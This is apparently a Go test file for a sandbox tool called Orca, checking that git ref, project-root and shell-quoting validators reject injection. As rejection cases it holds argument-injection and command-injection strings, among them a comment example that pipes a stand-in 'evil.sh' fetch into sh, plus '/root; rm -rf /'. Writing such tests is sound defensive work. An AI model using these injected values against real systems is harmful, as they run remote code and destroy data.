package sandbox

import (
	"strings"
	"testing"
)

// Every one of these values arrives from Orca's environment and is handed to
// `git` as an argv element. argv stops shell injection but not argument
// injection: git reads a leading `-` as an option, so an unchecked
// ORCA_REPO_REF_HEAD of "--upload-pack=curl evil.sh|sh" runs that command.
func TestOrcaRejectsArgumentInjectionInHeadAndRef(t *testing.T) {
	bad := []string{
		"--upload-pack=touch /tmp/pwned",
		"-oProxyCommand=touch /tmp/pwned",
		strings.Repeat("a", 40)+" --upload-pack=x",
		"HEAD",
		"refs/heads/main",
		"",
	}
	for _, v := range bad {
		if orcaSHARE.MatchString(v) {
			t.Errorf("orcaSHARE accepted a non-commit-id head: %q", v)
		}
	}
	for _, v := range []string{
		strings.Repeat("a", 40), // sha-1 object id
		strings.Repeat("a", 64), // sha-256 object id
	} {
		if !orcaSHARE.MatchString(v) {
			t.Errorf("orcaSHARE rejected a valid object id: %q", v)
		}
	}
	for _, v := range []string{"--upload-pack=x", "-x", "", "a b", "a;b", "$(x)"} {
		if orcaBranchRE.MatchString(v) {
			t.Errorf("orcaBranchRE accepted an unsafe ref: %q", v)
		}
	}
	if !orcaBranchRE.MatchString("refs/heads/feat/createos-sandbox-recipe") {
		t.Error("orcaBranchRE rejected an ordinary ref")
	}
}

// The project root lands inside a remote `sh -c` script and in a git refspec.
func TestOrcaRejectsUnsafeProjectRoot(t *testing.T) {
	for _, v := range []string{"relative/path", "/root; rm -rf /", "/root$(x)", "-/root", ""} {
		if orcaRootRE.MatchString(v) {
			t.Errorf("orcaRootRE accepted an unsafe root: %q", v)
		}
	}
	if !orcaRootRE.MatchString("/workspace/repo") {
		t.Error("orcaRootRE rejected the default root")
	}
}

// Orca adopts the checkout only when the branch equals the workspace name
// verbatim, but the sandbox name has no such rule and must stay API-safe.
func TestOrcaSandboxNameIsSanitizedAndBounded(t *testing.T) {
	cases := map[string]string{
		"cos-run4":              "orca-cos-run4",
		"Feature/Big Refactor":  "orca-feature-big-refactor",
		"":                      "orca-workspace",
		strings.Repeat("x", 80): "orca-" + strings.Repeat("x", 35),
	}
	for in, want := range cases {
		t.Setenv("ORCA_WORKSPACE_NAME", in)
		t.Setenv("ORCA_VM_INSTANCE_ID", "")
		if got := orcaSandboxName(); got != want {
			t.Errorf("orcaSandboxName(%q) = %q, want %q", in, got, want)
		}
		if len(want) > 40 {
			t.Errorf("name %q exceeds the 40 character bound", want)
		}
	}
}

func TestOrcaShellQuoteContainsSingleQuotes(t *testing.T) {
	got := orcaShellQuote(`a'; rm -rf /; '`)
	if strings.Contains(got, `'; rm`) && !strings.Contains(got, `'\''`) {
		t.Errorf("orcaShellQuote left a quote break in %q", got)
	}
	if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
		t.Errorf("orcaShellQuote did not wrap the value: %q", got)
	}
}

func TestOrcaParseAgentsRejectsUnknownNames(t *testing.T) {
	if _, err := orcaParseAgents("claude,nope"); err == nil {
		t.Fatal("orcaParseAgents accepted an unknown agent name")
	}
	// A bare "cursor" is the name users type; the binary it installs is not.
	if _, err := orcaParseAgents("cursor-agent"); err == nil {
		t.Fatal("orcaParseAgents accepted a binary name as an agent name")
	}
}

func TestOrcaParseAgentsNormalizesAndDedupes(t *testing.T) {
	got, err := orcaParseAgents("  Claude , codex,claude,, ")
	if err != nil {
		t.Fatalf("orcaParseAgents: %v", err)
	}
	if len(got) != 2 || got[0] != "claude" || got[1] != "codex" {
		t.Errorf("want [claude codex], got %v", got)
	}
}

func TestOrcaParseAgentsEmptyInstallsNothing(t *testing.T) {
	got, err := orcaParseAgents("")
	if err != nil || len(got) != 0 {
		t.Errorf("empty --agents must install nothing, got %v (err %v)", got, err)
	}
}

// Every agent needs a probe binary and an installer, or the install step either
// re-runs forever or silently never runs. The binary names are pinned because
// they are what gets probed and linked: cursor installs `cursor-agent`, so
// probing `cursor` would reinstall on every create.
func TestOrcaAgentsTableIsComplete(t *testing.T) {
	want := map[string]string{
		"opencode": "opencode",
		"claude":   "claude",
		"pi":       "pi",
		"codex":    "codex",
		"cursor":   "cursor-agent",
	}
	if len(orcaAgents) != len(want) {
		t.Fatalf("agent table has %d entries, want %d", len(orcaAgents), len(want))
	}
	for name, wantBin := range want {
		a, ok := orcaAgents[name]
		if !ok {
			t.Errorf("agent %q missing from table", name)
			continue
		}
		if a.bin != wantBin {
			t.Errorf("agent %q probes %q, want %q", name, a.bin, wantBin)
		}
		if a.install == "" {
			t.Errorf("agent %q has no install command", name)
		}
	}
}

// A vendor installer that exits non-zero, or that exits 0 without finishing our
// script, must not be reported as a successful install or a skip. Guards the
// collision that an exit-code protocol would have had with installer statuses.
func TestOrcaLastLineDistinguishesOutcomes(t *testing.T) {
	cases := []struct{ name, out, want string }{
		{"installed", "fetching...\ndone\n" + orcaAgentInstalled + "\n", orcaAgentInstalled},
		{"skipped", orcaAgentSkipped + "\n", orcaAgentSkipped},
		{"trailing blank lines", orcaAgentInstalled + "\n\n  \n", orcaAgentInstalled},
		{"marker not last is not trusted", orcaAgentInstalled + "\nHappy coding!\n", "Happy coding!"},
		{"no marker", "installer wrote nothing useful\n", "installer wrote nothing useful"},
		{"empty", "", ""},
	}
	for _, tc := range cases {
		if got := orcaLastLine(tc.out); got != tc.want {
			t.Errorf("%s: orcaLastLine = %q, want %q", tc.name, got, tc.want)
		}
	}
}

// The generated script must judge presence on the system PATH and link into it,
// or an agent installed only under $HOME stays invisible to Orca.
func TestOrcaInstallScriptLinksIntoSystemPath(t *testing.T) {
	script := orcaInstallScript(orcaAgents["claude"])
	for _, want := range []string{
		"ln -sf",
		"/usr/local/bin/claude",
		orcaSystemPath,
		orcaAgentInstalled,
		orcaAgentSkipped,
	} {
		if !strings.Contains(script, want) {
			t.Errorf("install script missing %q", want)
		}
	}
}
